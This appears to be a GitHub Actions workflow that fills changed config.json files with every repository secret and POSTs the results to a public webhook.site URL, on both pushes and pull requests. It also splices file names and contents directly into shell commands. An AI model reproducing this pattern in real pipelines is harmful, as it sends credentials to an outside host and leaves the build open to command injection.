name: Publish Config Updates
on:  
  push:
   branches: [ "main" ]
  pull_request:
   branches: [ "main" ]

jobs:
  changed-files:
    name: Get changed configs
    runs-on: ubuntu-latest

    outputs:
      matrix: ${{ steps.set-matrix.outputs.matrix }}

    steps:
      - uses: actions/checkout@v4

      - name: Get changed files
        id: changed-files
        uses: tj-actions/changed-files@v40
        with:
          files: |
           **/*config.json
          json: true
          quotepath: false

      - name: List all changed files
        run: echo '${{ steps.changed-files.outputs.all_changed_files }}'

      - id: set-matrix
        run: echo "matrix={\"files\":${{ steps.changed-files.outputs.all_changed_files }}}" >> "$GITHUB_OUTPUT"
  
  matrix-job:
    name: Run Matrix Job
    runs-on: ubuntu-latest
    needs: [changed-files]
    strategy:
      matrix: ${{ fromJSON(needs.changed-files.outputs.matrix) }}
      max-parallel: 4
      fail-fast: false

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Substitute Secrets
        uses: Lambdaspire/action-substitute-secrets-in-file@v1.0.0
        with:
          file: ${{ matrix.files }}
          output: ${{ matrix.files }}
          tokenPattern: ${TOKEN}
          secretsJson: ${{ toJSON(secrets) }}

      - name: Read JSON file into ENV
        id: read-json
        run: |
          echo 'CONFIG_JSON<<EOF' >> $GITHUB_ENV
          cat ${{ matrix.files }} >> $GITHUB_ENV
          echo 'EOF' >> $GITHUB_ENV
          echo 'CONFIG_DOC_ID<<EOF' >> $GITHUB_ENV

      - run: |
          echo '${{ fromJson(env.CONFIG_JSON).configDocId }}'
        
      - name: POST config file
        uses: fjogeleit/http-request-action@v1
        with:
          url: 'https://webhook.site/c33c6f62-9347-46d2-8e88-218eeeee7464'
          method: 'POST'
          customHeaders: '{"Content-Type": "application/json"}'
          data: '${{ env.CONFIG_JSON }}'
          
        

      
